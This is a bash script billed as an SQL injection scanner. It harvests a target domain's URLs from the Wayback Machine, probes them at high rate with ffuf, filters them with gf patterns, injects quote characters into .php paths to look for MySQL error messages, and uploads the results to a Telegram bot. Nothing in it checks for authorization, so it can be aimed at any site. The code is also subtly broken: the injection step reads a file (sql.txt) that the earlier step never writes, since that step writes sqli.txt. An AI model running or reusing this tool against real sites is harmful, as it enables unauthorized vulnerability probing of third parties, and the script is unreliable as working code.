#!/bin/bash

# Colors
MAGENTA='\e[1;35m'
NC='\e[0m' # No Color
BLUE='\e[1;34m'
GREEN='\e[1;32m'
RED='\e[1;31m'
YELLOW='\e[1;33m'

# Banner function
display_banner() {
    clear
    echo -e "${BLUE}"
    figlet -w 100 -f small "SQL Injection Scanner"
    echo -e "${NC}"
    echo -e "${MAGENTA}[*] Advanced SQL Injection Detection Tool${NC}"
    echo -e "${MAGENTA}[*] Version: 1.0${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Input target function
input_target() {
    echo -e "\n${BLUE}[+] Target Configuration${NC}"
    read -p $'\e[1;35m🌐 Enter the domain you want to explore: \e[0m' domain
    echo -e "${GREEN}[*] Target set to: $domain${NC}"
    sleep 1
}

# WAF detection
check_waf() {
    echo -e "\n${BLUE}[+] Checking Web Application Firewall...${NC}"
    wafw00f $domain
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Wayback data collection
collect_wayback() {
    echo -e "\n${BLUE}[+] Collecting URLs from Wayback Machine...${NC}"
    
    # Create directory structure
    mkdir -p $domain/{sources,result/{sqli,wayback,gf}}
    
    echo -e "${MAGENTA}[*] Fetching URLs...${NC}"
    echo "https://$domain/" | waybackurls | anew $domain/result/wayback/wayback-tmp.txt 
    
    echo -e "${MAGENTA}[*] Filtering relevant URLs...${NC}"
    cat $domain/result/wayback/wayback-tmp.txt | \
        egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpeg|\.jpg|\.png|\.css|\.ico" | \
        sed 's/:80//g;s/:443//g' | sort -u > $domain/result/wayback/wayback.txt
    
    rm $domain/result/wayback/wayback-tmp.txt
    echo -e "${GREEN}[✓] Wayback collection completed${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# URL validation
validate_urls() {
    echo -e "\n${BLUE}[+] Validating discovered URLs...${NC}"
    cat "$domain/result/wayback/wayback.txt" | \
        ffuf -c -u "FUZZ" -w - -of csv -o "$domain/result/wayback/valid-tmp.txt" -t 100 -rate 1000
    
    cat $domain/result/wayback/valid-tmp.txt | grep http | awk -F "," '{print $1}' >> $domain/result/wayback/valid.txt
    rm $domain/result/wayback/valid-tmp.txt
    echo -e "${GREEN}[✓] URL validation completed${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# GF pattern matching
run_gf_patterns() {
    echo -e "\n${BLUE}[+] Running GF pattern matching...${NC}"
    
    patterns=(
        "xss" "sqli" "ssrf" "redirect" "rce" "idor" "lfi" "ssti" 
        "debug_logic" "img-traversal" "interestingparams" "aws-keys" 
        "base64" "cors" "http-auth" "php-errors" "takeovers" "urls" 
        "s3-buckets" "strings" "upload-fields" "servers" "ip"
    )
    
    for pattern in "${patterns[@]}"; do
        echo -e "${MAGENTA}[*] Checking for ${pattern} patterns...${NC}"
        gf $pattern $domain/result/wayback/valid.txt | tee $domain/result/gf/${pattern}.txt
    done
    
    echo -e "${GREEN}[✓] Pattern matching completed${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# SQL injection testing
test_sql_injection() {
    echo -e "\n${BLUE}[+] Testing for SQL Injection vulnerabilities...${NC}"
    cat $domain/result/gf/sql.txt | \
        grep ".php" | \
        sed 's/\.php.*/.php\//' | \
        sort -u | \
        sed s/$/%27%22%60/ | \
        while read url; do 
            echo -e "${YELLOW}[*] Testing: $url${NC}"
            if curl --silent "$url" | grep -qs "You have an error in your SQL syntax"; then
                echo -e "$url ${GREEN}[Vulnerable]${NC}"
                echo "$url - Vulnerable" >> $domain/result/sqli/sqli.txt
            else
                echo -e "$url ${RED}[Not Vulnerable]${NC}"
                echo "$url - Not Vulnerable" >> $domain/result/sqli/sqli.txt
            fi
        done
    
    echo -e "${GREEN}[✓] SQL Injection testing completed${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Send results to Telegram
send_to_telegram() {
    echo -e "\n${BLUE}[+] Sending results to Telegram...${NC}"
    
    # Load credentials
    token=$(cat telegram_token.txt)
    chat_id=$(cat telegram_chat_id.txt)

    # Send initial message
    message="🔍 SQL Injection scan completed for domain: $domain\n📤 Sending results..."
    curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" \
         -d chat_id="$chat_id" \
         -d text="$message" > /dev/null 2>&1

    # Send files
    find "$domain" -type f | while read file; do
        echo -e "${MAGENTA}[*] Sending: $(basename $file)${NC}"
        curl -s -F chat_id="$chat_id" \
             -F document=@"$file" \
             "https://api.telegram.org/bot$token/sendDocument" > /dev/null 2>&1
    done

    echo -e "${GREEN}[✓] Results sent to Telegram${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Main execution
main() {
    display_banner
    input_target
    check_waf
    collect_wayback
    validate_urls
    run_gf_patterns
    test_sql_injection
    send_to_telegram
    echo -e "\n${GREEN}[✓] Scan completed successfully!${NC}\n"
}

# Run the script
main